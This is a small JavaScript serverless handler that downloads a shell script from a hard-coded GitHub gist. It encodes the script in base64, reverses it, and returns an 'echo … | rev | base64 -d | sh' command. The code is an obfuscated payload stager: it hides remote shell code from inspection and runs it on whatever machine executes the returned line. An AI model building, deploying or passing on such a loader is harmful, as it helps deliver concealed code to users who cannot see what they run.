export default async function handler(req, res) {
  const GIST_URL = "https://gist.githubusercontent.com/VannXD0/e7ba34f1d641d40f209fc0bf899bc6ff/raw/a623799f90de9120d904cb5ce6f0dca9ef090934/Arc.sh";
  
  try {
    const response = await fetch(GIST_URL);
    if (!response.ok) return res.status(404).send("echo 'Gist Not Found'");
    
    const script = await response.text();
    const payload = Buffer.from(script).toString('base64').split('').reverse().join('');
    
    res.setHeader("Content-Type", "text/plain");
    return res.status(200).send(`echo "${payload}" | rev | base64 -d | sh`);
  } catch (e) {
    return res.status(500).send("echo 'Server Error'");
  }
}
